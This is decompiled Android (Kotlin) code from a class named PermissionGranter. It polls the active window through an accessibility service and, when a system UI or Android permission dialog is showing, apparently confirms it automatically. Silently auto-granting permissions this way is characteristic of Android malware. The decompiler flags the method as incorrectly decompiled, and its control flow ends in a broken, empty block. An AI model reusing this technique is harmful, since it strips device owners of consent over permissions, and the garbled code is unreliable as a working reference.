package com.storm.safe.rock.manager;

import android.view.accessibility.AccessibilityNodeInfo;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$startSecondaryConfirmationMonitoring$1", m214403f = "PermissionGranter.kt", m214404l = {2638, 2645}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$startSecondaryConfirmationMonitoring$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52039a1;

    /* renamed from: a2 */
    public int f52040a2;

    /* renamed from: a3 */
    public C0260a2 f52041a3;

    /* renamed from: a4 */
    public int f52042a4;

    /* renamed from: a5 */
    public final /* synthetic */ C0260a2 f52043a5;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$startSecondaryConfirmationMonitoring$1(C0260a2 c0260a2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52043a5 = c0260a2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$startSecondaryConfirmationMonitoring$1(this.f52043a5, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((PermissionGranter$startSecondaryConfirmationMonitoring$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:11:0x0032, code lost:
    
        if (p000.b81.m210571b1(1000, r11) == r1) goto L20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x004e, code lost:
    
        if (p000.b81.m210571b1(500, r11) == r1) goto L20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x0050, code lost:
    
        return r1;
     */
    /* JADX WARN: Removed duplicated region for block: B:15:0x003b  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00a9  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:19:0x004e -> B:21:0x0051). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        int i;
        C0260a2 c0260a2;
        int i2;
        String string;
        C1351vv c1351vv = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = this.f52042a4;
        C0260a2 c0260a22 = this.f52043a5;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            this.f52042a4 = 1;
        } else if (i3 == 1) {
            kg1.m213544f4(obj);
        } else {
            if (i3 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i2 = this.f52040a2;
            i = this.f52039a1;
            c0260a2 = this.f52041a3;
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = c0260a2.f52108a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 无法获取窗口节点");
            } else {
                CharSequence packageName = rootInActiveWindow.getPackageName();
                if (packageName == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                if (C0260a2.m211293f1()) {
                    c0260a2.f52121b3 = false;
                    rootInActiveWindow.recycle();
                    return c1351vv;
                }
                if (!string.equals("com.android.systemui") && !string.equals("android")) {
                    c0260a2.f52121b3 = false;
                    rootInActiveWindow.recycle();
                    return c1351vv;
                }
                if (C0260a2.m211275c3(rootInActiveWindow, string) && c0260a2.m211316e9(rootInActiveWindow)) {
                    c0260a2.f52121b3 = false;
                    rootInActiveWindow.recycle();
                    return c1351vv;
                }
                rootInActiveWindow.recycle();
            }
            i2++;
            if (i2 >= i) {
                c0260a22.f52121b3 = false;
                return c1351vv;
            }
            if (!c0260a2.f52121b3) {
                return c1351vv;
            }
            this.f52041a3 = c0260a2;
            this.f52039a1 = i;
            this.f52040a2 = i2;
            this.f52042a4 = 2;
        }
        i = 5;
        c0260a2 = c0260a22;
        i2 = 0;
        if (i2 >= i) {
        }
    }
}
